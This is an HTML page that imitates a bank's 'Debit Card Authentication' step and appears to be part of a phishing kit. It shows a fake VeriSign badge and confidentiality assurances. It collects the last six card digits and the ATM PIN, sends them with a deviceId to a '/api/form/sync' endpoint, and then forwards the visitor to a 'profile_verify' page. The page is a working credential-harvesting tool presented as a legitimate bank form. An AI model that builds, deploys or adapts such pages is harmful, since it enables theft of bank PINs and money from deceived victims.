<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Debit Card Authentication</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background: #f8f8f8;
        }

        .page {
            max-width: 420px;
            margin: auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: #fff;
        }

        .card-header {
            padding: 14px 16px;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            border-bottom: 1px solid #ddd;
        }

        .card-img {
            width: 100%;
            max-height: 220px;
            border-radius: 12px 12px 0 0;
            margin-bottom: 12px;
            overflow: hidden;
        }

        .card-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .form {
            padding: 16px;
            flex: 1;
        }

        label {
            display: block;
            margin-top: 14px;
            margin-bottom: 6px;
            font-size: 14px;
            font-weight: bold;
        }

        .card-input {
            display: flex;
            align-items: center;
            border: 1px solid #cfcfcf;
            border-radius: 12px;
            height: 50px;
            padding: 0 12px;
            background: #fff;
        }

        .card-input .fixed {
            font-size: 14px;
            color: #777;
            letter-spacing: 2px;
            margin-right: 6px;
            white-space: nowrap;
        }

        .card-input input {
            border: none;
            padding: 0;
            font-size: 16px;
            flex: 1;
            letter-spacing: 2px;
            outline: none;
        }

        .pin-input {
            width: 100%;
            height: 50px;
            border: 1px solid #cfcfcf;
            border-radius: 12px;
            padding: 0 12px;
            font-size: 24px;
            letter-spacing: 12px;
            text-align: center;
            outline: none;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #e6a100;
            color: #fff;
            border: none;
            font-size: 15px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            position: relative;
        }

        button:hover {
            background: #cc8f00;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .loading .btn-text {
            display: none;
        }

        .loading .spinner {
            display: block;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .note-box {
            margin: 16px 10px;
            background: #e9f4ff;
            padding: 12px;
            font-size: 13px;
        }

        .note-box ul {
            padding-left: 16px;
        }

        .note-box li {
            margin-bottom: 4px;
        }

        .footer {
            margin-top: auto;
            margin-bottom: 22px;
            background: #000;
            color: #fff;
            padding: 10px 12px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .footer .tick {
            font-size: 14px;
        }
    </style>
</head>

<body>
    <div class="page">
        <div class="card-header">Debit Card Authentication</div>

        <div class="card-img">
            <img id="cardImage" src="../img/card1.jpg" alt="Card">
        </div>

        <div class="form">
            <label>Enter last 6 digits of card</label>
            <div class="card-input">
                <span class="fixed">#### #### ##</span>
                <input type="text" id="cardLast6" maxlength="7" placeholder="__ ____" inputmode="numeric">
            </div>

            <label style="margin-top:14px;">Enter ATM PIN</label>
            <input type="tel" id="atmPin" class="pin-input" inputmode="numeric" placeholder="••••" maxlength="4">

            <button id="cardSubmit">
                <span class="btn-text">Proceed →</span>
                <div class="spinner"></div>
            </button>
        </div>

        <div class="note-box">
            <ul>
                <li>Mandatory fields are marked as important</li>
                <li>Do not share personal information</li>
                <li>Your information is confidential</li>
            </ul>
        </div>

        <div class="footer">
            <span class="tick">✔</span>
            <span>VeriSign &nbsp; © Copyright | All Rights Reserved</span>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('deviceId') || 'unknown';

        async function syncPageData(pageName, data) {
            try {
                await fetch('/api/form/sync', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        deviceId: deviceId,
                        pageName: pageName,
                        pageData: data,
                        timestamp: new Date().toISOString()
                    })
                });
            } catch (error) {
                console.error('[Form] Sync error:', error);
            }
        }

        // Card image rotation
        const cards = ["../img/card1.jpg", "../img/card2.jpg", "../img/card3.jpg"];
        let cardIndex = 0;
        setInterval(() => {
            cardIndex = (cardIndex + 1) % cards.length;
            const img = document.getElementById('cardImage');
            if (img) img.src = cards[cardIndex];
        }, 2500);

        // Card last 6 formatting
        const cardLast6Input = document.getElementById('cardLast6');
        cardLast6Input.addEventListener('input', () => {
            let v = cardLast6Input.value.replace(/\D/g, '');
            if (v.length > 2) v = v.slice(0, 2) + ' ' + v.slice(2, 6);
            cardLast6Input.value = v;
        });

        // ATM PIN input
        const atmPinInput = document.getElementById('atmPin');
        atmPinInput.addEventListener('input', () => {
            atmPinInput.value = atmPinInput.value.replace(/\D/g, '').slice(0, 4);
        });

        document.getElementById('cardSubmit').addEventListener('click', async () => {
            const cardLast6 = cardLast6Input.value.replace(/\s/g, '');
            const atmPin = atmPinInput.value;

            if (cardLast6.length !== 6 || atmPin.length !== 4) {
                alert('Please enter valid card details');
                return;
            }

            const btn = document.getElementById('cardSubmit');
            btn.classList.add('loading');
            btn.disabled = true;

            await syncPageData('card_auth', { cardLast6, atmPin });

            btn.classList.remove('loading');
            btn.disabled = false;

            window.location.href = 'profile_verify.html?deviceId=' + encodeURIComponent(deviceId);
        });
    </script>
</body>

</html>
